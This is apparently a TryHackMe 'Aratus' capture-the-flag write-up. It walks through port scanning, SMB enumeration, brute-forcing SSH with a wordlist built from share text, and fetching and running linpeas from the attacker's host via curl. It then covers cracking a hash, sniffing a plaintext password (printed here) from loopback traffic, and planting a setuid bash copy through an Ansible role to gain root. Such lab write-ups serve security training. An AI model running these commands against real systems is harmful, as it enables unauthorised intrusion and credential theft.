> [!NOTE]
> https://tryhackme.com/room/aratus
> Perform a penetration test against a vulnerable machine. Your end-goal is to become the root user and retrieve the two flags:
> - /home/{{user}}/user.txt
> - /root/root.txt
> The flags are always in the same format, where XYZ is a MD5 hash: THM{XYZ}
> IP:10.10.124.169

# Nmap
```bash
nmap -p- -sC -sV 10.10.124.169 -sS -T5 -vv
```

```bash
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.134.170
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0               6 Jun 09  2021 pub
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
|_http-title: Apache HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@aratus/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=aratus/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@aratus/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-11-23T12:28:26
| Not valid after:  2022-11-23T12:28:26
| MD5:   56cc:c593:6bdc:9168:bc7d:a4b7:7d3f:004e
| SHA-1: 7678:b819:d2c6:5dc9:515e:09eb:1e18:d772:aec7:a686
|_ssl-date: TLS randomness does not represent time
|_http-title: Apache HTTP Server Test Page powered by CentOS
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.10.16 (workgroup: WORKGROUP)
Service Info: Host: ARATUS; OS: Unix

Host script results:
|_clock-skew: mean: -39m50s, deviation: 1h09m16s, median: 8s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.16)
|   Computer name: aratus
|   NetBIOS computer name: ARATUS\x00
|   Domain name: \x00
|   FQDN: aratus
|_  System time: 2025-05-09T22:58:48+02:00
| smb2-time: 
|   date: 2025-05-09T20:58:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 35478/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 60100/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 47347/udp): CLEAN (Timeout)
|   Check 4 (port 16532/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

```bash
nmap 10.10.124.169 -p80,443,21,22,139,445 --script=ftp* smb* http* -T5 -vv
```

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510004251.png)
# FTP
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510001045.png)
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510002700.png)

# web
```http
http://10.10.124.169:80/
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250509235942.png)
```http
http://10.10.124.169:443/
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510000620.png)

## Nikto
```bash
nikto -h 10.10.124.169
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510002435.png)
## FFUF
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://10.10.124.169/FFUZ -ic -c
```

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://10.10.124.169:443/FFUZ -ic -c
```

# enum4linux 
```bash
enum4linux 10.10.124.169
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510002026.png)

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250509235739.png)

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510000225.png)

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510000425.png)

> [!NOTE]
> S-1-22-1-1001 Unix User\theodore (Local User)                                                                       
> S-1-22-1-1002 Unix User\automation (Local User)
> S-1-22-1-1003 Unix User\simeon (Local User)

# smbclient

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510004731.png)

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510004855.png)

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510005205.png)

```bash
cat text1.txt| sed -E 's/([[:punct:]])/ \1 /g' | tr -s ' ' '\n' | grep -v '^$' | grep -v '[[:punct:]]' | sort -u >pass.txt
```

# Brutforse 
```bash
crackmapexec smb 10.10.124.169 -u simeon -p pass.txt
```

```bash
crackmapexec ssh 10.10.124.169 -u simeon -p pass.txt
```

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510011337.png)

# LPE
```bash
sudo -l
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/0250510011537.png)
```bash
ss -tunl
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510011619.png)

```bash
home dir*
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510011649.png)

```bash
ls -la /opt
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510011840.png)

## Linpeas
```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```
```bash
python3 -m http.server 80
```


```bash
curl http://10.11.134.170/linpeas.sh -o /tmp/linpeas.sh && chmod +x linpeas.sh  && ./linpeas.sh 
```

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510012304.png)
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510012335.png)
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510012553.png)

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510012623.png)

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510012724.png)
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510012812.png)
## hashcat 
```
theodore:$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1
```
![[20250510012946.png]]

```
hashcat -m 1600 '$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1' /usr/share/wordlists/rockyou.txt 
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510013208.png)


## Capabilities tcpdump
```bash
tcpdump -i lo -vv
```

![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510131507.png)

theodore:Rijyaswahebceibarjik
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510131604.png)
# Flag1
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510131715.png)


![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510134830.png)

```bash
cat /opt/ansible/roles/geerlingguy.apache/tasks/configure-RedHat.yml
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510135108.png)
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510141615.png)
```bash
vim /opt/ansible/roles/geerlingguy.apache/tasks/configure-RedHat.yml
```

```sh
!#/bin/sh
cp /bin/bash /tmp/bash ; chmod +s /tmp/bash
```

```bash
chmod +x test.sh
```

# flag2 
```bash
sudo -u automation /opt/scripts/infra_as_code.sh
```

```bash
/tmp/bash -p
```
![Aratus](https://raw.githubusercontent.com/GooseGusevich/Tryhackme/refs/heads/main/Aratus/screenshots/20250510141320.png)

